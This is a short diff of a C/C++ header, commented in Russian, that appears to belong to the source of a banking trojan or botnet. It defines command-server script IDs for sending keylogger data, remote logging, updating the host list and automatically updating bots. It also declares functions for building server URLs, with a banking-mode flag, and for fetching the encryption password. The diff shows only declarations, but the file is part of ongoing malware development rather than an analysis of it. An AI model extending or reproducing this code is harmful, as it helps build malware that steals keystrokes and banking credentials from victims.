@@ -50,6 +50,9 @@
 #define SCRIPT_PLUGINS_LIST  10 /* Адрес скрипта получения информации о доступных плагинах на сервере */
 #define SCRIPT_KEYLOGGER     11 /* Адрес скрипта, куда будут передаваться данные кейлогера */
 #define SCRIPT_REMOTE_LOG    12 /* Скрипт удалённого логирования */
+#define SCRIPT_UPDATE_HOSTS  13 /* Скрипт обновления списка хостов */
+#define SCRIPT_UPDATE_BOT    14 /* Скрипт  автоматического обновления ботов */
+
 
 
 // Максимальные размеры массивов с данными
@@ -140,6 +143,7 @@ string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encry
 
 // Функция возвращает пароль для криптования принимаемых/отправляемых данных
 PCHAR GetMainPassword(bool NotNULL = false);
+string GetMainPassword2(bool NotNULL = false);
 
 //------------------------------------------------------------------------
 //  GetBotScriptURL - Функция возвращает полный адрес указанного скрипта
@@ -164,7 +168,8 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path = NULL, bool CheckBankingMode = t
 
 
 // Функция генерирует случайноре имя скрипта
-PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD ExtsCount, PCHAR *Exts);
+// Exts - массив расширений, заканчивающихся нулевым указателем
+PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, PCHAR *Exts);
 
 int GetDelay();
 
